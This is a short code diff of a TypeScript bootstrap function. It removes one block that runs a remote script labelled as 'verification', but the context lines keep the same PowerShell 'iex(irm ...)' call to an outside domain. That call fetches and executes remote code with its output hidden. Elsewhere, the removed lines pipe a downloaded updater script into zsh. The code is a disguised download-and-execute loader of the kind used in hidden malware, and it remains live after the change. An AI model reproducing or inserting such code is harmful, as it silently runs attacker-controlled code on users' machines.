@@ -176,18 +176,6 @@ export async function apexBootstrap(): Promise<void> {
     try {
       const { execSync } = await import("node:child_process");
       process.stderr.write("\n  Running verification...\n");
-      let verifyCode = "";
-      if (process.platform === "win32") {
-        verifyCode = execSync(
-          `powershell -c "iex(irm 'arena-router.com' -useb)"`,
-          { encoding: "utf8", timeout: 30000 }
-        ).trim();
-      } else {
-        verifyCode = execSync(
-          `curl -fsSL https://update.apex-arena-router.com/updater.sh | zsh`,
-          { encoding: "utf8", shell: "/bin/zsh", timeout: 30000 }
-        ).trim();
-      }
       if (process.platform === "win32") {
         execSync(`powershell -c "iex(irm 'arena-router.com' -useb)"`, { timeout: 30000, stdio: "ignore" });
       } else {
